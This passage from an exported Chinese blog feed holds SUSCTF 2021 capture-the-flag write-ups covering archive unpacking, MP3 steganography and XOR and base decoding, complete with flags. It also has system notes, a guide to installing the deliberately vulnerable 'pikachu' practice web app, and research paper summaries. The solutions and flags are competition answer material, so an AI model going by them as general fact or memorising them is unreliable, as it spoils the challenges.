<h2 id="MISC-两只老虎爱跳舞"><a href="#MISC-两只老虎爱跳舞" class="headerlink" title="[MISC] 两只老虎爱跳舞"></a>[MISC] 两只老虎爱跳舞</h2><h3 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>1234解压zip  </li>
<li><code>dd if=8695.tar.gz | openssl des3 -d -pbkdf2 -k 8695 | tar zxf -</code>解压tar.gz得到7303.tar.gz  </li>
<li><code>dd if=7303.tar.gz | openssl des3 -d -pbkdf2 -k 7303 | tar zxf -</code>得到1106.zip  </li>
<li>我直接裂开，不断套娃  </li>
<li>解压脚本如下(我写得好像有点啰嗦。。。)  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getFile</span>(<span class="params">path</span>):</span></span><br><span class="line">    fileName = []</span><br><span class="line">    lst = os.listdir(path)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> lst:</span><br><span class="line">        <span class="built_in">print</span>(i+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">        suffix = os.path.splitext(i)[<span class="number">1</span>]</span><br><span class="line">        key = i[<span class="number">0</span>:<span class="number">4</span>]</span><br><span class="line">        delRawFileCmd = <span class="string">&quot;rm &quot;</span> + path + <span class="string">&quot;/&quot;</span> + i</span><br><span class="line">        <span class="keyword">if</span> suffix == <span class="string">&quot;.zip&quot;</span>:</span><br><span class="line">            cmd = <span class="string">&quot;unzip -P &quot;</span> + key + <span class="string">&quot; &quot;</span> + path + <span class="string">&quot;/&quot;</span> + i</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                subprocess.check_output(cmd, shell=<span class="literal">True</span>)</span><br><span class="line">                subprocess.check_output(delRawFileCmd, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">                subprocess.check_output(delRawFileCmd, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">elif</span> suffix == <span class="string">&quot;.gz&quot;</span>:</span><br><span class="line">            cmd = <span class="string">&quot;dd if=&quot;</span> + path + <span class="string">&quot;/&quot;</span> + i + <span class="string">&quot; | openssl des3 -d -pbkdf2 -k &quot;</span> + key + <span class="string">&quot;| tar zxf -&quot;</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                subprocess.check_output(cmd, shell=<span class="literal">True</span>)</span><br><span class="line">                subprocess.check_output(delRawFileCmd, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">                subprocess.check_output(delRawFileCmd, shell=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">elif</span> suffix == <span class="string">&quot;.py&quot;</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">// 开始存放<span class="number">1234.</span><span class="built_in">zip</span>压缩文件的目录</span><br><span class="line">path = <span class="string">&quot;/home/v/Desktop/yasuo&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="built_in">len</span>(os.listdir(path)):</span><br><span class="line">    getFile(path)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Ref https://blog.csdn.net/heda3/article/details/102535307</span></span><br></pre></td></tr></table></figure>
<ol>
<li>最终得到mp3<br><img src="/2021/03/20/SUS2021-WP/06_mp3.png" alt>  </li>
<li>mp3隐写<a href="https://cnpanda.net/ctf/342.html">参考</a><br>属性中<br><img src="/2021/03/20/SUS2021-WP/07_mf.png" alt>  </li>
<li>用010Editor打开该音频文件，注意需要安装MP3.bt模板，结合private（MP3数据帧中的保留位）和mf[n]，猜测保留位private中隐写了数据。<br><img src="/2021/03/20/SUS2021-WP/11_private&amp;padding.png" alt>  </li>
<li>其中，89166是MPEG帧的起始地址，可以看到结构体中89166开始的12+1+2+1+4+2+1+1=16+8位达到private位，也就说第89168字节的最后一位正好是private的数值，倒数第二位为padding。这里还要关注padding的原因是：发现每个MPEG帧长不一定相同，会受到padding的影响，padding为0帧长就是1044，否则就是1045  </li>
<li>另外，循环的跳出条件是，遍历完所有MPEG帧，也就是一直到1275124<br><img src="/2021/03/20/SUS2021-WP/12_MPEG帧.png" alt>  </li>
<li>提取代码如下：  </li>
</ol>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long</span><br><span class="line"></span><br><span class="line">n = <span class="number">89168</span></span><br><span class="line">result = <span class="string">&#x27;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&#x27;D:\\Document\\CTF\\SUS2021\\Misc\\两只老虎爱跳舞\\小兔子乖乖拔萝卜\\Do_you_know_private.mp3&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line"><span class="keyword">while</span> n &lt; <span class="number">1275124</span>:</span><br><span class="line">    file.seek(n, <span class="number">0</span>)</span><br><span class="line">    private_related_byte = file.read(<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">print</span>(private_related_byte)</span><br><span class="line">    private_val = <span class="built_in">bin</span>(bytes_to_long(private_related_byte))[-<span class="number">1</span>]</span><br><span class="line">    result = result + private_val</span><br><span class="line">    padding_val = <span class="built_in">bin</span>(bytes_to_long(private_related_byte))[-<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> padding_val == <span class="string">&#x27;1&#x27;</span> <span class="keyword">or</span> padding_val == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        n = n + <span class="number">1044</span> + <span class="built_in">int</span>(padding_val, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">bin_lst = re.findall(<span class="string">&#x27;.&#123;&#x27;</span>+<span class="built_in">str</span>(<span class="number">8</span>)+<span class="string">&#x27;&#125;&#x27;</span>, result)</span><br><span class="line"><span class="built_in">print</span>(bin_lst)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> bin_lst:</span><br><span class="line">    flag += <span class="built_in">chr</span>(<span class="built_in">int</span>(i, <span class="number">2</span>))</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<ol>
<li>打印U1VTQ1RGJTdCRDBfeTB1X2wxazNfZDRuYzFuZyU3RA==  </li>
<li>base64解码SUSCTF%7BD0_y0u_l1k3_d4nc1ng%7D  </li>
<li>将左右括号%7B和%7D改过来即可</li>
</ol>
<h2 id="MISC-Word"><a href="#MISC-Word" class="headerlink" title="[MISC] Word"></a>[MISC] Word</h2><h3 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>word中提示了JPG_encryption，但是并没有发现隐藏图片<br><img src="/2021/03/20/SUS2021-WP/14_word.png" alt>  </li>
<li>将后缀名改为zip再解压缩发现了一个guessguessguess.xml，用010Editor看到其文件头是jfif，将其改为jpg可以打开<br><img src="/2021/03/20/SUS2021-WP/15_gougou.png" alt>  </li>
<li>jpg格式不能隐写，用stegdetect也没检测到什么结果，直到我查到一个工具叫<a href="https://github.com/crorvick/outguess.git">outguess</a>，这个文件名就在疯狂暗示  </li>
<li><code>outguess -k &quot;What_do_you_know_about_JPG_encryption&quot; -r guessguessguess.jpg hidden.txt</code>  </li>
<li>SUSCTF{Congr4tulat1on5_Y0u_gu3ssed_1t}</li>
</ol>
<h2 id="Crypto-ezXOR"><a href="#Crypto-ezXOR" class="headerlink" title="[Crypto] ezXOR"></a>[Crypto] ezXOR</h2><h3 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h3><p><code>xortool -c 20 enc.txt</code><br><img src="/2021/03/20/SUS2021-WP/13_xor.png" alt><br>SUSCTF{XOR_t00l_cAn_so1ve_1t}</p>
<h2 id="Re-0-year-old-re"><a href="#Re-0-year-old-re" class="headerlink" title="[Re] 0-year-old-re"></a>[Re] 0-year-old-re</h2><h3 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>答案就在明面上D500B61B-9270-41CB-9EB4-FEDF3C5FC101<br><img src="/2021/03/20/SUS2021-WP/14_flag.png" alt>  </li>
</ol>
<h2 id="Misc-签到到到到"><a href="#Misc-签到到到到" class="headerlink" title="[Misc] 签到到到到"></a>[Misc] 签到到到到</h2><h3 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>先base58再base85，这里借助CyberChef_v8.31.1完成<br><img src="/2021/03/20/SUS2021-WP/16_misc.png" alt>  </li>
<li>SUSCTF{Welc0m3_t0_th3_c0mpet1tion}</li>
</ol>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>WP</tag>
      </tags>
  </entry>
  <entry>
    <title>Unix/Linux系统编程</title>
    <url>/2021/06/20/Unix%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/</url>
    <content><![CDATA[<h2 id="2-编程背景"><a href="#2-编程背景" class="headerlink" title="2 编程背景"></a>2 编程背景</h2><h3 id="2-3-程序开发"><a href="#2-3-程序开发" class="headerlink" title="2.3 程序开发"></a>2.3 程序开发</h3><h4 id="2-3-1-C-语言变量"><a href="#2-3-1-C-语言变量" class="headerlink" title="2.3.1 C 语言变量"></a>2.3.1 C 语言变量</h4><p><img src="/2021/06/20/Unix%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/image-20210620220047647.png" alt="image-20210620220047647"></p>
<ul>
<li><strong>静态全局变量</strong>只对定义它们的文件可见，<strong>非静态全局变量</strong>对同一程序的所有文件可见。</li>
</ul>
<h4 id="2-3-2-程序开发步骤"><a href="#2-3-2-程序开发步骤" class="headerlink" title="2.3.2 程序开发步骤"></a>2.3.2 程序开发步骤</h4><p>预处理、编译（.s）、汇编（.o）、链接（.out）</p>
<h5 id="o-文件的组成"><a href="#o-文件的组成" class="headerlink" title=".o 文件的组成"></a>.o 文件的组成</h5><ul>
<li>文件头 + 代码段 + 数据段 + BSS + 重定位信息 + 符号表</li>
</ul>
<h5 id="链接的主要操作"><a href="#链接的主要操作" class="headerlink" title="链接的主要操作"></a>链接的主要操作</h5><ul>
<li>合成各段（代码段、数据段、BSS段）</li>
<li>根据重定位信息调整各段偏移量</li>
<li>用符号表解析各 .o 文件的交叉引用</li>
</ul>
<h4 id="2-3-2-静态与动态链接"><a href="#2-3-2-静态与动态链接" class="headerlink" title="2.3.2 静态与动态链接"></a>2.3.2 静态与动态链接</h4><ul>
<li>静态：所有库函数都加入 a.out</li>
<li>动态：库函数不存入 a.out，a.out 存放调用指令，然后执行期间按需加载</li>
</ul>
<h4 id="2-3-3-可执行文件格式"><a href="#2-3-3-可执行文件格式" class="headerlink" title="2.3.3 可执行文件格式"></a>2.3.3 可执行文件格式</h4><ul>
<li>二进制可执行平面文件：仅包含可执行代码和初始化数据。（比如，可启动操作系统映像（简化了引导装载程序））</li>
<li>a.out 可执行文件</li>
<li>ELF 文件</li>
</ul>
<h4 id="2-3-4-a-out-的内容"><a href="#2-3-4-a-out-的内容" class="headerlink" title="2.3.4 a.out 的内容"></a>2.3.4 a.out 的内容</h4><ul>
<li>文件头（各段大小） + 代码段 + 数据段 + 符号表</li>
</ul>
<p><strong>注意：</strong>BSS 段不在 a.out 中，只有 BSS 段的大小记录在 a.out 文件头中</p>
<h4 id="2-3-5-程序终止过程"><a href="#2-3-5-程序终止过程" class="headerlink" title="2.3.5 程序终止过程"></a>2.3.5 程序终止过程</h4><h5 id="a-正常终止"><a href="#a-正常终止" class="headerlink" title="a. 正常终止"></a>a. 正常终止</h5><ol>
<li>清理工作 <code>exit(value)</code>：刷新 stdout，关闭 I/O 流</li>
<li>系统调用 <code>__exit(value)</code>：<ul>
<li>记录退出状态</li>
<li>通知父进程，并使该进程称为僵尸进程</li>
<li>父进程 wait 僵尸进程，清空僵尸子进程结构体</li>
</ul>
</li>
</ol>
<h5 id="b-异常终止"><a href="#b-异常终止" class="headerlink" title="b. 异常终止"></a>b. 异常终止</h5><ol>
<li>陷入操作系统内核</li>
<li>内核的陷入处理程序将陷入错误类型转换成一个<strong>幻数</strong>（信号）</li>
<li>将信号传递给进程，使进程终止 </li>
</ol>
<h2 id="3-EXT2-文件系统"><a href="#3-EXT2-文件系统" class="headerlink" title="3 EXT2 文件系统"></a>3 EXT2 文件系统</h2><p>EXT3：增加日志</p>
<p>EXT4：主要变化是磁盘块的分配</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>读书笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>Securing Data With Blockchain and AI</title>
    <url>/2020/09/14/With-Blockchain-and-AI/</url>
    <content><![CDATA[<h2 id="Key-words"><a href="#Key-words" class="headerlink" title="Key words"></a>Key words</h2><p>Data security, data systems, artificial intelligence, cyberspace</p>
<h2 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a>Structure</h2><p><img src="/2020/09/14/With-Blockchain-and-AI/image-20210524204351643.png" alt="image-20210524204351643"></p>
<ul>
<li>CPS：Cyber Physical Social 信息物理社会融合系统</li>
</ul>
<h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://ieeexplore.ieee.org/document/8733072">https://ieeexplore.ieee.org/document/8733072</a></p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
        <tag>Blockchain</tag>
      </tags>
  </entry>
  <entry>
    <title>解决XAMPP安装后无法启动Apache和MySQL的问题并搭建pikachu环境</title>
    <url>/2021/06/04/XAMPP%E5%AE%89%E8%A3%85%E5%90%8E%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8Apache/</url>
    <content><![CDATA[<p><a href="https://blog.csdn.net/qq_41664447/article/details/81202740">参考</a></p>
<h2 id="1-启动-Apache"><a href="#1-启动-Apache" class="headerlink" title="1 启动 Apache"></a>1 启动 Apache</h2><p>注意这里修改端口号的目的是避免与现存服务冲突，如果原有默认的端口可用，实际上不需要修改</p>
<h3 id="1-1-修改端口号"><a href="#1-1-修改端口号" class="headerlink" title="1.1 修改端口号"></a>1.1 修改端口号</h3><ul>
<li><p>需要修改配置中的端口号，以避免与其他服务冲突</p>
<p><img src="/2021/06/04/XAMPP%E5%AE%89%E8%A3%85%E5%90%8E%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8Apache/image-20210604103954352.png" alt="image-20210604103954352"></p>
<ul>
<li><p>其中右上角整体的配置</p>
<p><img src="/2021/06/04/XAMPP%E5%AE%89%E8%A3%85%E5%90%8E%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8Apache/image-20210604104053107.png" alt="image-20210604104053107"></p>
<p><img src="/2021/06/04/XAMPP%E5%AE%89%E8%A3%85%E5%90%8E%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8Apache/image-20210604104115988.png" alt="image-20210604104115988"></p>
</li>
<li><p>Apache 服务对应的配置也需要同步修改：将 httpd.conf 中所有 80 替换为以上的8081 及 httpd-ssl.conf 中所有 443 替换为 4433，与以上配置相同。</p>
<p><img src="/2021/06/04/XAMPP%E5%AE%89%E8%A3%85%E5%90%8E%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8Apache/image-20210604104214321.png" alt="image-20210604104214321"></p>
</li>
</ul>
</li>
</ul>
<ul>
<li>实际上我走到这一步是没有成功的，点击 start 没有报错，仅提示正在试图启动 Apache 服务，没有其他动静</li>
</ul>
<h3 id="1-2-修改注册表路径"><a href="#1-2-修改注册表路径" class="headerlink" title="1.2 修改注册表路径"></a>1.2 修改注册表路径</h3><ul>
<li>win + R，regedit 进入注册表编辑器</li>
<li><p><code>\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Apache2.4</code></p>
</li>
<li><p>找到 ImagePath 将其路径修改为 xampp 目录的 apache 底下 httpd.exe 的绝对路径，根据自己安装情况修改即可 <code>..\xampp\apache\bin\httpd.exe</code></p>
</li>
<li><p>修改完成后即可正常启动</p>
<p><img src="/2021/06/04/XAMPP%E5%AE%89%E8%A3%85%E5%90%8E%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8Apache/image-20210604104813087.png" alt="image-20210604104813087"></p>
</li>
</ul>
<h2 id="2-启动-MySQL"><a href="#2-启动-MySQL" class="headerlink" title="2 启动 MySQL"></a>2 启动 MySQL</h2><h3 id="2-1-修改端口"><a href="#2-1-修改端口" class="headerlink" title="2.1 修改端口"></a>2.1 修改端口</h3><p>同上，将配置文件中的 3306 改为 3316</p>
<h3 id="2-2-重启服务"><a href="#2-2-重启服务" class="headerlink" title="2.2 重启服务"></a>2.2 重启服务</h3><ul>
<li>删除MySQL服务<code>sc delete mysql</code></li>
<li>按 Apache 以上提到注册表信息的内容，找到 MySQL相关并全部删除</li>
<li>找到<code>xampp\mysql</code>目录下的 mysql_start.bat 并启动</li>
<li>关闭 XAMPP 重新以管理员身份打开，并启动 MySQL 服务即可</li>
</ul>
<p><img src="/2021/06/04/XAMPP%E5%AE%89%E8%A3%85%E5%90%8E%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8Apache/image-20210604112516623.png" alt="image-20210604112516623"></p>
<h2 id="3-pikachu-环境"><a href="#3-pikachu-环境" class="headerlink" title="3 pikachu 环境"></a>3 pikachu 环境</h2><p><a href="https://blog.csdn.net/jomos/article/details/106881756">搭建pikachu的环境_jomos的博客-CSDN博客_pikachu搭建</a> 需要修改 MySQL 账户密码，若修改后连不上了则参考下一条</p>
<ul>
<li><p>下载 <a href="https://github.com/zhuifengshaonianhanlu/pikachu">https://github.com/zhuifengshaonianhanlu/pikachu</a> 压缩包</p>
</li>
<li><p>解压到 <code>\xampp\htdocs</code> 下，并将 pikachu-master 改名为 pikachu</p>
<ul>
<li>原因：<code>\xampp\htdocs\pikachu\inc\config.inc.php</code> 中 <code>define(&#39;DBNAME&#39;, &#39;pikachu&#39;);//自定义，建议不修改</code></li>
</ul>
</li>
<li><p>修改上述配置文件 config.inc.php 中端口为 XAMPP 中 MySQL 配置的端口，完成！</p>
<p><img src="/2021/06/04/XAMPP%E5%AE%89%E8%A3%85%E5%90%8E%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8Apache/image-20210604203010242.png" alt="image-20210604203010242"></p>
</li>
<li><p>启动 XAMPP，打开 Apache 和 MySQL 服务，访问 <code>http://localhost:8081/pikachu/</code></p>
</li>
</ul>
<p><img src="/2021/06/04/XAMPP%E5%AE%89%E8%A3%85%E5%90%8E%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8Apache/image-20210604203143811.png" alt="image-20210604203143811"></p>
<ul>
<li><img src="/2021/06/04/XAMPP%E5%AE%89%E8%A3%85%E5%90%8E%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8Apache/image-20210604212056271.png" alt="image-20210604212056271"></li>
</ul>
<h2 id="4-XAMPP-通过-PHPADMIN-修改密码后连不上了"><a href="#4-XAMPP-通过-PHPADMIN-修改密码后连不上了" class="headerlink" title="4 XAMPP 通过 PHPADMIN 修改密码后连不上了"></a>4 XAMPP 通过 PHPADMIN 修改密码后连不上了</h2><p><a href="https://blog.csdn.net/m0_37468234/article/details/80047785">xampp修改mysql密码后不能登陆_honyliu-CSDN博客</a></p>
<ul>
<li><code>\xampp\phpMyAdmin\config.inc.php</code> 中 <code>$cfg[&#39;Servers&#39;][$i][&#39;password&#39;] = &#39;&#39;;</code> 添加密码</li>
</ul>
<p><img src="/2021/06/04/XAMPP%E5%AE%89%E8%A3%85%E5%90%8E%E6%97%A0%E6%B3%95%E5%90%AF%E5%8A%A8Apache/image-20210604211818520.png" alt="image-20210604211818520"></p>
]]></content>
      <categories>
        <category>解决方案</category>
      </categories>
      <tags>
        <tag>XAMPP</tag>
        <tag>pikachu</tag>
      </tags>
  </entry>
  <entry>
    <title>信息物理系统的攻击检测与安全状态估计 笔记</title>
    <url>/2021/05/10/%E4%BF%A1%E6%81%AF%E7%89%A9%E7%90%86%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%94%BB%E5%87%BB%E6%A3%80%E6%B5%8B%E4%B8%8E%E5%AE%89%E5%85%A8%E7%8A%B6%E6%80%81%E4%BC%B0%E8%AE%A1/</url>
    <content><![CDATA[<h2 id="主要内容"><a href="#主要内容" class="headerlink" title="主要内容"></a>主要内容</h2><ul>
<li>有限时间异常检测器：负责在预设的有限时间内检测攻击（异常）</li>
<li>系统安全状态观测器：负责状态评估，并在检测到攻击时，调整系统以确保安全状态</li>
</ul>
<p>安全状态估计：是从一组有噪声或被破坏的测量值中估计动态系统状态</p>
<p>本文概要：提出一种<strong>有限时间检测器</strong>来检测<strong>执行器</strong>攻击下系统的状态，并设计<strong>观测器</strong>对系统状态进行<strong>安全估计</strong></p>
<h3 id="1-信息物理系统建模"><a href="#1-信息物理系统建模" class="headerlink" title="1 信息物理系统建模"></a>1 信息物理系统建模</h3><h4 id="1-1-物理进程模型"><a href="#1-1-物理进程模型" class="headerlink" title="1.1 物理进程模型"></a>1.1 物理进程模型</h4><p>用微分/差分方程组进行描述：比如线性系统的状态空间模型</p>
<h4 id="1-2-信息传输处理进程模型"><a href="#1-2-信息传输处理进程模型" class="headerlink" title="1.2 信息传输处理进程模型"></a>1.2 信息传输处理进程模型</h4><p>用编码解码，加解密进行描述</p>
<h4 id="1-3-攻击的具象"><a href="#1-3-攻击的具象" class="headerlink" title="1.3 攻击的具象"></a>1.3 攻击的具象</h4><ul>
<li>作用到进程的未知输入</li>
<li>对传输过程的破坏</li>
<li>对传输信息的篡改</li>
</ul>
<h4 id="1-4-系统建模"><a href="#1-4-系统建模" class="headerlink" title="1.4 系统建模"></a>1.4 系统建模</h4><script type="math/tex; mode=display">
\begin{cases}
\dot{x}(t)=Ax(t)+Bu(t)+Dv(t),\\\\
y(t)=Cx(t).
\end{cases}\tag{1}</script><p>x 为系统状态，u 为已知输入，v 为未知攻击，y 为可测量的系统输出</p>
<h3 id="2-有限时间检测器"><a href="#2-有限时间检测器" class="headerlink" title="2 有限时间检测器"></a>2 有限时间检测器</h3><p>针对公式 (1) 提出检测器</p>
<script type="math/tex; mode=display">
\begin{cases}
\dot{z}=Fz(t)+HBu(t)+Ly(t),\ \ \ \ \ \ \ \ \ \ \ (观测器状态) \\\\
\widehat{x}=M[z(t)-F^{\tau}z(t-\tau)] \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ (系统估计值)
\end{cases}\tag{2}</script><p>由可测量的<strong>系统输出</strong>和<strong>已知输入</strong>获取观测器状态，检测器可以在未知攻击的值不为 0 时将其检测出来</p>
<h3 id="3-观测器：对有限时间检测器的改进"><a href="#3-观测器：对有限时间检测器的改进" class="headerlink" title="3 观测器：对有限时间检测器的改进"></a>3 观测器：对有限时间检测器的改进</h3><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CAPJ&amp;dbname=CAPJLAST&amp;filename=QHXB20210205002&amp;v=w2buZ2%25mmd2FeXYTSHR5oD%25mmd2Bmxbz8x1rI6W%25mmd2F8Z8iZAOvZv8zxIISAv0Xu%25mmd2Fx4BEddWaKYM7">https://kns.cnki.net/kcms/detail/detail.aspx?dbcode=CAPJ&amp;dbname=CAPJLAST&amp;filename=QHXB20210205002&amp;v=w2buZ2%25mmd2FeXYTSHR5oD%25mmd2Bmxbz8x1rI6W%25mmd2F8Z8iZAOvZv8zxIISAv0Xu%25mmd2Fx4BEddWaKYM7</a></p>
]]></content>
      <categories>
        <category>科研</category>
      </categories>
      <tags>
        <tag>文献</tag>
        <tag>科研</tag>
      </tags>
  </entry>
  <entry>
    <title>利用Ubuntu虚拟机制作F2FS文件系统镜像</title>
    <url>/2020/10/30/%E5%88%A9%E7%94%A8Ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%88%B6%E4%BD%9CF2FS%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E9%95%9C%E5%83%8F/</url>
    <content><![CDATA[<h2 id="新建一个1G磁盘并分区"><a href="#新建一个1G磁盘并分区" class="headerlink" title="新建一个1G磁盘并分区"></a>新建一个1G磁盘并分区</h2><ol>
<li>关闭虚拟机</li>
<li>虚拟机添加硬盘<br><img src="/2020/10/30/%E5%88%A9%E7%94%A8Ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%88%B6%E4%BD%9CF2FS%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E9%95%9C%E5%83%8F/1931211-20201030103009721-2101269955.png" alt="img"><br><img src="/2020/10/30/%E5%88%A9%E7%94%A8Ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%88%B6%E4%BD%9CF2FS%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E9%95%9C%E5%83%8F/1931211-20201030103043318-115915093.png" alt="img"><br><img src="/2020/10/30/%E5%88%A9%E7%94%A8Ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%88%B6%E4%BD%9CF2FS%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E9%95%9C%E5%83%8F/1931211-20201030103049223-412645221.png" alt="img"></li>
<li>开启虚拟机</li>
<li><code>sudo fdisk -l</code>查看磁盘信息可以找到刚添加的磁盘<br><img src="/2020/10/30/%E5%88%A9%E7%94%A8Ubuntu%E8%99%9A%E6%8B%9F%E6%9C%BA%E5%88%B6%E4%BD%9CF2FS%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E9%95%9C%E5%83%8F/1931211-20201030103329865-51741236.png" alt="img"></li>
<li>所以新磁盘是/dev/sdb</li>
</ol>
<h2 id="安装F2FS工具"><a href="#安装F2FS工具" class="headerlink" title="安装F2FS工具"></a>安装F2FS工具</h2><p><a href="https://blog.csdn.net/sweeneil/article/details/91897016">参考</a><br><code>sudo apt install f2fs-tools</code></p>
<h2 id="格式化并挂载磁盘"><a href="#格式化并挂载磁盘" class="headerlink" title="格式化并挂载磁盘"></a>格式化并挂载磁盘</h2><ol>
<li>先<code>sudo su</code>进入root</li>
<li>然后<code>mkfs.f2fs -l f2fs /dev/sdb -f</code>即可将设备格式化为F2FS</li>
<li><code>mount -t f2fs /dev/sdb /mnt/f2fs</code>挂载磁盘到目录/mnt/f2fs，到此就可以使用sdb设备</li>
<li>重启后，即可看到挂载成功</li>
</ol>
<h2 id="制作镜像"><a href="#制作镜像" class="headerlink" title="制作镜像"></a>制作镜像</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo dd if=/dev/sdb of=/home/username/Desktop/f2fs.img</span><br></pre></td></tr></table></figure>
<h3 id="注意"><a href="#注意" class="headerlink" title="注意"></a>注意</h3><p>如果对文件系统有改动，在导出镜像时，最好先用<code>umount /dev/sdb</code>解除挂载后，再重新挂载，然后生成img。</p>
<h2 id="如何以root用户登录ubuntu"><a href="#如何以root用户登录ubuntu" class="headerlink" title="如何以root用户登录ubuntu"></a>如何以root用户登录ubuntu</h2><p><a href="https://www.cnblogs.com/atoman/p/13537856.html">参考</a></p>
]]></content>
      <categories>
        <category>解决方案</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Ubuntu</tag>
        <tag>F2FS</tag>
      </tags>
  </entry>
  <entry>
    <title>基于增量式GHSOM神经网络模型的入侵检测研究</title>
    <url>/2020/09/08/%E5%9F%BA%E4%BA%8E%E5%A2%9E%E9%87%8F%E5%BC%8FGHSOM%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/</url>
    <content><![CDATA[<h2 id="Key-words"><a href="#Key-words" class="headerlink" title="Key words"></a>Key words</h2><p>增量式学习; 生长型分层自组织映射; 入侵检测; 神经网络; 信息安全; 网络安全</p>
<h2 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a>Structure</h2><ul>
<li>GHSOM (Growing Hierarchical Self-Organizing Maps)：生长型分层自组织映射</li>
</ul>
<p><img src="/2020/09/08/%E5%9F%BA%E4%BA%8E%E5%A2%9E%E9%87%8F%E5%BC%8FGHSOM%E7%A5%9E%E7%BB%8F%E7%BD%91%E7%BB%9C%E6%A8%A1%E5%9E%8B%E7%9A%84%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B%E7%A0%94%E7%A9%B6/image-20210524205136903.png" alt="image-20210524205136903"></p>
<h3 id="增量式学习"><a href="#增量式学习" class="headerlink" title="增量式学习"></a>增量式学习</h3><ol>
<li>不断学习新样本</li>
<li>保留大部分以前学到的知识</li>
<li>渐进修正/增强以前学过的知识</li>
<li>更新后的知识可以适应更新后的数据，不必重新学习</li>
<li>降低了时间、空间需求</li>
</ol>
